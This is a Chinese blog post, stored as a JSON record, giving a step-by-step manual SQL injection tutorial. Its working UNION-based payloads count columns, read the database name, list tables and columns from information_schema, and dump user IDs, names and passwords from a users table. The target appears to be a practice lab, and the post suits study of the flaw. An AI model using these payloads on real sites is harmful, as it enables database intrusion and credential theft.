{"title":"sql手注步骤（非盲注）","slug":"sql手注步骤","date":"2018-05-05T03:52:16.000Z","updated":"2018-05-09T09:47:23.424Z","comments":true,"excerpt":"","content":"<h1 id=\"手注步骤\"><a href=\"#手注步骤\" class=\"headerlink\" title=\"手注步骤\"></a>手注步骤</h1><h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><p><strong>1.判断是否存在注入，注入是字符型还是数字型</strong></p>\n<p><strong>2.猜解SQL查询语句中的字段数</strong></p>\n<p><strong>3.确定显示的字段顺序</strong></p>\n<p><strong>4.获取当前数据库</strong></p>\n<p><strong>5.获取数据库中的表</strong></p>\n<p><strong>6.获取表中的字段名</strong></p>\n<p><strong>7.下载数据</strong></p>\n<h2 id=\"1-判断是否存在注入，注入是字符型还是数字型\"><a href=\"#1-判断是否存在注入，注入是字符型还是数字型\" class=\"headerlink\" title=\"1.判断是否存在注入，注入是字符型还是数字型\"></a>1.判断是否存在注入，注入是字符型还是数字型</h2><p>判断注入类型：<strong>数字型，字符型</strong></p>\n<h2 id=\"2-猜解SQL查询语句中的字段数\"><a href=\"#2-猜解SQL查询语句中的字段数\" class=\"headerlink\" title=\"2.猜解SQL查询语句中的字段数\"></a>2.猜解SQL查询语句中的字段数</h2><p>判断字段数：</p>\n<pre><code>1′ or 1=1 order by 1,2,3,4,5 #\n</code></pre><p>数字累加，直到不出结果或者报错。</p>\n<hr>\n<p><strong>注释常常使用<code>--+</code>或者<code>#</code>或者<code>%23</code></strong></p>\n<hr>\n<p>或者用：</p>\n<pre><code>-1′ union select 1,2 #\n</code></pre><hr>\n<p><strong>两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来</strong></p>\n<hr>\n<p>顺路进行下一步</p>\n<h2 id=\"3-确定显示的字段顺序\"><a href=\"#3-确定显示的字段顺序\" class=\"headerlink\" title=\"3.确定显示的字段顺序\"></a>3.确定显示的字段顺序</h2><pre><code>-1′ union select 1,2 #\n</code></pre><h2 id=\"4-获取当前数据库\"><a href=\"#4-获取当前数据库\" class=\"headerlink\" title=\"4.获取当前数据库\"></a>4.获取当前数据库</h2><pre><code>-1′ union select 1,database() #\n</code></pre><h2 id=\"5-获取数据库中的表\"><a href=\"#5-获取数据库中的表\" class=\"headerlink\" title=\"5.获取数据库中的表\"></a>5.获取数据库中的表</h2><pre><code>-1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #\n</code></pre><p>从information_schema中查找表名</p>\n<hr>\n<p><strong>进行联合查询时要将查询用的语句放在最后一项</strong></p>\n<hr>\n<h2 id=\"6-获取表中的字段名\"><a href=\"#6-获取表中的字段名\" class=\"headerlink\" title=\"6.获取表中的字段名\"></a>6.获取表中的字段名</h2><pre><code>-1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #\n</code></pre><p>爆users表内的表名</p>\n<h2 id=\"7-下载数据\"><a href=\"#7-下载数据\" class=\"headerlink\" title=\"7.下载数据\"></a>7.下载数据</h2><pre><code>-1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #\n</code></pre><p>从users里面取出所有用户的user_id,first_name,last_name,password的数据</p>\n","categories":[{"name":"sql","path":"api/categories/sql.json"}],"tags":[{"name":"sql","path":"api/tags/sql.json"}]}